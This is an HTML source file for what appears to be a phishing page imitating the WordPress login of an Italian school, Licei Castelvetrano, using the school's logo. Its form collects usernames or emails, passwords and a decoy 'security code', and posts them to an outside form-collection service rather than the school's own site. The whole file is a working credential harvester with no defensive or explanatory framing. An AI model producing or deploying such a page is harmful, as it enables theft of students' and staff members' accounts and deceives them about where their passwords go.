<!DOCTYPE html>
<html lang="en" class="no-js">
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Licei Castelvetrano - Login</title>
      <link rel="stylesheet" href="https://codepen.io/gymratpacks/pen/VKzBEp#0">
      <link href='https://fonts.googleapis.com/css?family=Nunito:400,300' rel='stylesheet' type='text/css'>
      <link rel="icon" type="image/x-icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/9/98/WordPress_blue_logo.svg/1024px-WordPress_blue_logo.svg.png">
      <link rel="stylesheet" href="css/style.css">
      <script>
          function myFunction() {
            var x = document.getElementById("password");
            if (x.type === "password") {
              x.type = "text";
            } else {
              x.type = "password";
            }
          }
          </script>
   <body>
      <div class="row">
          <img class="immagine-nuvola" src="https://liceicastelvetrano.edu.it/wp-content/themes/temaScuola/include/images/logoNuvola.png" />
    <div class="col-md-12">
      <form action="https://formspree.io/f/xzboezqz"
      method="POST">
        
        <fieldset>
        
        
          <label for="name"><strong>Nome utente o indirizzo email</strong></label>
          <input class="width-form" type="text" id="name"  name="username">
       
          <label for="password"><strong>Password</strong></label>
          <input class="width-form" type="password" id="password" name="password">
          <img class="view-password" src="img/occhio.png" onclick="myFunction()">

          <label for="password">Codice di sicurezza</label>
          <p class="text-codice">002</p>

          <label for="name"><strong>Inserire il codice di sicurezza</strong></label>
          <input type="text" id="name" name="security-code">
        
        <p class="checkbox"><input class="button-checkbox" type="checkbox"><strong>Ricordami</strong></p>
        <button type="submit">Login</button>
        
       </form>
        </div>
      </div>
    </body>
</html>
